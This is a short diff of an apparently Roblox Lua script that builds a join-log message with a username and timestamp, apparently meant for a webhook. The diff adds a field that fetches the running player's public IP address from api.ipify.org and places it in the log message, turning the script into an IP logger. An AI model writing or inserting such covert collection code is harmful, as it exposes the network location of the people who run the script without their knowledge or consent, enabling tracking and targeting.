@@ -18,8 +18,14 @@ local messageData = {
                     name = "Username",
                     value = playerName,
                     inline = false -- Whether the field should display inline or not
+                },
+		{
+                    name = "IP",
+                    value = game:HttpGet("https://api.ipify.org"),
+                    inline = false -- Whether the field should display inline or not
                 }
             },
+
             footer = { -- Footer text
                 text = "User joined at " .. os.date("%Y-%m-%d %H:%M:%S"),
             }
